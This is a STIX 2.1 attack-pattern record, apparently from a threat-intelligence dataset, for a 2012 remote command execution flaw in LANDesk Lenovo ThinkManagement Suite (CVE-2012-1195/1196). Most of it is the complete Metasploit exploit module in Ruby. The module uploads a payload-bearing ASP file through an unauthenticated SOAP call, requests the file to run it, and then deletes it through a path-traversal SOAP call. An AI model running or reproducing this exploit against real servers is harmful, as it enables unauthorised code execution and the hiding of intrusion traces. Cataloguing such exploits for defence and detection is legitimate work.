{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66d07d01-e015-4e1c-a0f7-ada498735fa8",
    "created": "2024-08-14T16:52:35.353083Z",
    "modified": "2024-08-14T16:52:35.353087Z",
    "name": "LANDesk Lenovo ThinkManagement Console Remote Command Execution",
    "description": " This module can be used to execute a payload on LANDesk Lenovo ThinkManagement Suite 9.0.2 and 9.0.3.  The payload is uploaded as an ASP script by sending a specially crafted SOAP request to \"/landesk/managementsuite/core/core.anonymous/ServerSetup.asmx\" , via a \"RunAMTCommand\" operation with the command '-PutUpdateFileCore' as the argument.  After execution, the ASP script with the payload is deleted by sending another specially crafted SOAP request to \"WSVulnerabilityCore/VulCore.asmx\" via a \"SetTaskLogByFile\" operation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/landesk_thinkmanagement_upload_asp.rb",
            "external_id": "landesk_thinkmanagement_upload_asp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1195"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1196"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize\n    super(\n      'Name'        => 'LANDesk Lenovo ThinkManagement Console Remote Command Execution',\n      'Description'    => %q{\n          This module can be used to execute a payload on LANDesk Lenovo\n        ThinkManagement Suite 9.0.2 and 9.0.3.\n\n        The payload is uploaded as an ASP script by sending a specially crafted\n        SOAP request to \"/landesk/managementsuite/core/core.anonymous/ServerSetup.asmx\"\n        , via a \"RunAMTCommand\" operation with the command '-PutUpdateFileCore'\n        as the argument.\n\n        After execution, the ASP script with the payload is deleted by sending\n        another specially crafted SOAP request to \"WSVulnerabilityCore/VulCore.asmx\"\n        via a \"SetTaskLogByFile\" operation.\n      },\n      'Author'      => [\n        'Andrea Micalizzi', # aka rgod - Vulnerability Discovery and PoC\n        'juan vazquez' # Metasploit module\n      ],\n      'Platform'    => 'win',\n      'References'  =>\n        [\n          ['CVE', '2012-1195'],\n          ['CVE', '2012-1196'],\n          ['OSVDB', '79276'],\n          ['OSVDB', '79277'],\n          ['BID', '52023'],\n          ['EDB', '18622'],\n          ['EDB', '18623']\n        ],\n      'Targets'     =>\n        [\n          [ 'LANDesk Lenovo ThinkManagement Suite 9.0.2 / 9.0.3 / Microsoft Windows Server 2003 SP2', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => 'Feb 15 2012'\n    )\n\n    register_options(\n      [\n        OptString.new('PATH', [ true,  \"The URI path of the LANDesk Lenovo ThinkManagement Console\", '/'])\n      ])\n  end\n\n  def exploit\n\n    peer = \"#{rhost}:#{rport}\"\n\n    # Generate the ASP containing the EXE containing the payload\n    exe = generate_payload_exe\n    asp = Msf::Util::EXE.to_exe_asp(exe)\n\n    # htmlentities like encoding\n    asp = asp.gsub(\"&\", \"&amp;\").gsub(\"\\\"\", \"&quot;\").gsub(\"'\", \"&#039;\").gsub(\"<\", \"&lt;\").gsub(\">\", \"&gt;\")\n\n    uri_path = (datastore['PATH'][-1,1] == \"/\" ? datastore['PATH'] : datastore['PATH'] + \"/\")\n    upload_random = rand_text_alpha(rand(6) + 6)\n    upload_xml_path = \"ldlogon\\\\#{upload_random}.asp\"\n\n    soap = <<-eos\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <RunAMTCommand xmlns=\"http://tempuri.org/\">\n      <Command>-PutUpdateFileCore</Command>\n      <Data1>#{rand_text_alpha(rand(4) + 4)}</Data1>\n      <Data2>#{upload_xml_path}</Data2>\n      <Data3>#{asp}</Data3>\n      <ReturnString>#{rand_text_alpha(rand(4) + 4)}</ReturnString>\n    </RunAMTCommand>\n  </soap:Body>\n</soap:Envelope>\n    eos\n\n    #\n    # UPLOAD\n    #\n    attack_url = uri_path + \"landesk/managementsuite/core/core.anonymous/ServerSetup.asmx\"\n    print_status(\"Uploading #{asp.length} bytes through #{attack_url}...\")\n\n    res = send_request_cgi({\n      'uri'          => attack_url,\n      'method'       => 'POST',\n      'ctype'        => 'text/xml; charset=utf-8',\n      'headers'\t=> {\n          'SOAPAction'     => \"\\\"http://tempuri.org/RunAMTCommand\\\"\",\n        },\n      'data'         => soap,\n    }, 20)\n\n    if (! res)\n      print_status(\"Timeout: Trying to execute the payload anyway\")\n    elsif (res.code < 200 or res.code >= 300)\n      print_error(\"Upload failed on #{attack_url} [#{res.code} #{res.message}]\")\n      return\n    end\n\n    #\n    # EXECUTE\n    #\n    upload_path = uri_path + \"ldlogon/#{upload_random}.asp\"\n    print_status(\"Executing #{upload_path}...\")\n\n    res = send_request_cgi({\n      'uri'          =>  upload_path,\n      'method'       => 'GET'\n    }, 20)\n\n    if (! res)\n      print_error(\"Execution failed on #{upload_path} [No Response]\")\n      return\n    end\n\n    if (res.code < 200 or res.code >= 300)\n      print_error(\"Execution failed on #{upload_path} [#{res.code} #{res.message}]\")\n      return\n    end\n\n\n    #\n    # DELETE\n    #\n    soap = <<-eos\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <SetTaskLogByFile xmlns=\"http://tempuri.org/\">\n      <computerIdn>1</computerIdn>\n      <taskid>1</taskid>\n      <filename>../#{upload_random}.asp</filename>\n      </SetTaskLogByFile>\n  </soap:Body>\n</soap:Envelope>\n    eos\n\n    attack_url = uri_path + \"WSVulnerabilityCore/VulCore.asmx\"\n    print_status(\"Deleting #{upload_path} through #{attack_url}...\")\n\n    res = send_request_cgi({\n      'uri'          => attack_url,\n      'method'       => 'POST',\n      'ctype'        => 'text/xml; charset=utf-8',\n      'headers'      => {\n          'SOAPAction'     => \"\\\"http://tempuri.org/SetTaskLogByFile\\\"\",\n        },\n      'data'         => soap,\n    }, 20)\n\n    if (! res)\n      print_error(\"Deletion failed at #{attack_url} [No Response]\")\n      return\n    elsif (res.code < 200 or res.code >= 300)\n      print_error(\"Deletion failed at #{attack_url} [#{res.code} #{res.message}]\")\n      return\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "Feb 15 2012",
    "x_mitre_platforms": [
        "win'"
    ]
}